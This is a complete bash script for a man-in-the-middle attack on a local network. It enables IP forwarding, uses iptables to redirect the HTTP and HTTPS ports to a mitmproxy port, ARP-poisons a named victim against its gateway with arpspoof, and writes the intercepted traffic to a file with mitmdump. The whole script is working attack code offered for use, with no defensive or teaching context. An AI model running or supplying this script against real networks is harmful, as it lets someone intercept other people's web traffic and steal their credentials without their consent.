#!/bin/bash

# make sure we're running as root
if [[ $EUID -ne 0 ]]; then
   echo "[!] This script must be run as root."
   exit 1
fi

# give command-line arguments meaningful names
INTERFACE=$1
VICTIM_IP=$2
GATEWAY_IP=$3
OUTFILE=$4

# enable traffic forwarding
echo "[+] enabling ipv4 forwarding..."  
sysctl -w net.ipv4.ip_forward=1  

# reroute incoming traffic on 80 (HTTP) and 443 (HTTPS) to come in on port 8080 instead
echo "[+] rerouting incoming traffic on ports 80 & 443 to come in on 8080 (mitmproxy)..."  
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port 8080  
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 -j REDIRECT --to-port 8080

# convince the target we're their default gateway via ARP spoofing / cache poisoning
echo "[+] spoofing arp..."  
arpspoof -i $INTERFACE -t $VICTIM_IP -r $GATEWAY_IP 2>/dev/null 1>/dev/null &

# launch mitmdump
echo "[+] mitm'ing $VICTIM_IP on $INTERFACE"
mitmdump -T --host -a $OUTFILE

# intercepting done, clean up
echo "[+] All done, cleaning up..."  
killall arpspoof  

# wait for arpspoof to die
wait

echo "[+] Hosts re-arped"
echo "[=] IPV4 FORWARDING AND HTTP/HTTPS REDIRECTION TO 8080 WILL PERSIST UNTIL REBOOT."
